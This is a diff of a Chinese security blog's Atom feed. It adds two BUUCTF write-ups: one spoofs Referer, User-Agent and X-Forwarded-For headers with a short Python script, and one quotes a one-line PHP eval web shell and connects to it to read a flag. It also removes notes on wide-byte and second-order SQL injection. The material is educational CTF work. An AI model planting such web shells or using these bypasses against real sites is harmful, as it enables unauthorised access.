@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://lingxin16.github.io/"/>
-  <updated>2020-06-12T15:17:09.035Z</updated>
+  <updated>2020-06-13T14:24:55.053Z</updated>
   <id>http://lingxin16.github.io/</id>
   
   <author>
@@ -15,6 +15,52 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>极客大挑战2019-Http</title>
+    <link href="http://lingxin16.github.io/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/"/>
+    <id>http://lingxin16.github.io/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/</id>
+    <published>2020-06-13T14:06:42.000Z</published>
+    <updated>2020-06-13T14:24:55.053Z</updated>
+    
+    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/1.png" alt="1"></p><p>主页并没有什么有用的信息，查看源文件，发现Secret.php</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/2.png" alt="2"></p><p>打开</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/3.png" alt="3"></p><p>提示It doesn’t come from ‘<a href="https://www.Sycsecret.com&#39;" target="_blank" rel="noopener">https://www.Sycsecret.com&#39;</a></p><p>那么就是http头伪造 利用burpsuit抓包修改 或者火狐编辑消息头</p><p>这里我用火狐 添加Referer:<a href="https://www.Sycsecret.com" target="_blank" rel="noopener">https://www.Sycsecret.com</a></p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/4.png" alt="4"></p><p>然后看到Please use “Syclover” browser</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/5.png" alt="5"></p><p>那么再更改User-Agent: “Syclover” browser</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/6.png" alt="6"></p><p>看到No!!! you can only read this locally!!!</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/7.png" alt="7"></p><p>那么再修改X-Forwarded-For: 127.0.0.1</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/8.png" alt="8"></p><p>得到flag</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/9.png" alt="9"></p><p>上边的操作也可以用Python脚本实现</p><pre><code class="Python"># -*- coding: UTF-8 -*-import requestsurl=&quot;http://node3.buuoj.cn:29753/Secret.php&quot;headers={    &quot;Referer&quot;: &quot;https://www.Sycsecret.com&quot;,    &quot;Origin&quot;:&quot;https://www.Sycsecret.com&quot;,    &quot;User-Agent&quot;: &quot;Syclover&quot;,    &quot;X-Forwarded-For&quot;: &quot;127.0.0.1&quot;}r=requests.get(url=url,headers=headers)print(r.text)</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+    
+      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
+    
+      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>极客大挑战2019-Knife</title>
+    <link href="http://lingxin16.github.io/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Knife/"/>
+    <id>http://lingxin16.github.io/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Knife/</id>
+    <published>2020-06-13T13:52:32.000Z</published>
+    <updated>2020-06-13T13:58:54.746Z</updated>
+    
+    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Knife/1.png" alt="1"></p><p>上边有提示我家菜刀丢了，你能帮我找一下么</p><p>并且有<code>eval($_POST[&quot;Syc&quot;]);</code>说明连接密码是Syc</p><p>既然提示菜刀，那么我们用菜刀连接</p><p>这里我用蚁剑，测试连接成功</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Knife/2.png" alt="2"></p><p>在根目录找到flag</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Knife/3.png" alt="3"></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+    
+      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
+    
+      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
+    
+  </entry>
   
   <entry>
     <title>极客大挑战2019-PHP</title>
@@ -398,48 +444,6 @@
     <summary type="html">
     
       &lt;h2 id=&quot;代码执行漏洞&quot;&gt;&lt;a href=&quot;#代码执行漏洞&quot; class=&quot;headerlink&quot; title=&quot;代码执行漏洞&quot;&gt;&lt;/a&gt;代码执行漏洞&lt;/h2&gt;
-    
-    </summary>
-    
-    
-    
-      <category term="代码审计" scheme="http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>代码审计day4</title>
-    <link href="http://lingxin16.github.io/2020/03/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day4/"/>
-    <id>http://lingxin16.github.io/2020/03/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day4/</id>
-    <published>2020-03-20T14:22:05.000Z</published>
-    <updated>2020-03-20T15:29:18.120Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><a id="more"></a><p>因为%df的关系, \的编码%5c被吃掉了,也就失去了转义的效果,直接被带入到mysql中,然后mysql在解读时无视了%a0%5c形成的新字节，那么单引号便重新发挥了效果</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h3><p>%df%27===&gt; (addslashes)====&gt; %df%5c%27====&gt;(GBK)====&gt;運’<br>用户输入===&gt;过滤函数===&gt;代码层的$sql==&gt; mysql处理请求= =&gt;mysql中的sql<br>默认编码character set_ client== &gt;根据character. set connection转码== &gt;更新数据库时转化成字段<br>所对应的编码</p><h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案:"></a>修复方案:</h3><p>(1)使用mysql_set_charset(GBK)指定字符集<br>(2)使用mysql _real_escape_string进行转义</p><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>注入点因为经过过滤处理无法触发sql注入漏洞,比如addslashes函数,将单引号等字符转义变成,但是存进数据库后，数据又被还原，在这种情况下。如果发现一个新的注入同时引用了被插入的数据库数据，就可以实现闭合新发现的注入漏洞引发二次注入(先将注入语句插入到数据库中，然后再触发语句)</p><p>一阶注入:<br>1.一阶SQL注 入发生在一个HTTP请求和响应中 ,对系统的攻击是立即执行的<br>2.攻击者在http请求中提交非法输入<br>3.应用程序处理非法输入。使用非法输入构造SQL语句<br>4.在攻击过程中向攻击者返回结果<br>二阶注入:<br>1.攻击者在http请求中提交恶意输入<br>2.恶意输入保存在数据库中<br>3.攻击者提交第二次http请求<br>4.为处理第二次http请求,程序在检索存储在数据库中的恶意输入，构造SQL语句<br>5.如果攻击成功,在第二次请求响应中返回结果</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;宽字节注入&quot;&gt;&lt;a href=&quot;#宽字节注入&quot; class=&quot;headerlink&quot; title=&quot;宽字节注入&quot;&gt;&lt;/a&gt;宽字节注入&lt;/h2&gt;
-    
-    </summary>
-    
-    
-    
-      <category term="代码审计" scheme="http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>代码审计day3</title>
-    <link href="http://lingxin16.github.io/2020/03/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day3/"/>
-    <id>http://lingxin16.github.io/2020/03/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day3/</id>
-    <published>2020-03-19T14:38:28.000Z</published>
-    <updated>2020-03-19T15:35:26.213Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="代码审计Sql注入漏洞"><a href="#代码审计Sql注入漏洞" class="headerlink" title="代码审计Sql注入漏洞"></a>代码审计Sql注入漏洞</h2><a id="more"></a><p>注入类型：数字型、字符型，这两种都包括以下几种注入</p><p>post注入、cookie注入、宽字节注入、二次注入、盲注、base64注入、探索注入</p><p>数字型：当输入的参数为整型时，则可认为是数字型注入</p><blockquote><p>$result = “select * from admin where id=$id”;</p></blockquote><p>不需要单引号来闭合</p><p>字符型：当输入的参数为字符串时，称之为字符型注入</p><blockquote><p>$result = “select * from admin where id=’$id’ ”;</p></blockquote><p>需要单引号来闭合</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;代码审计Sql注入漏洞&quot;&gt;&lt;a href=&quot;#代码审计Sql注入漏洞&quot; class=&quot;headerlink&quot; title=&quot;代码审计Sql注入漏洞&quot;&gt;&lt;/a&gt;代码审计Sql注入漏洞&lt;/h2&gt;
     
     </summary>
     
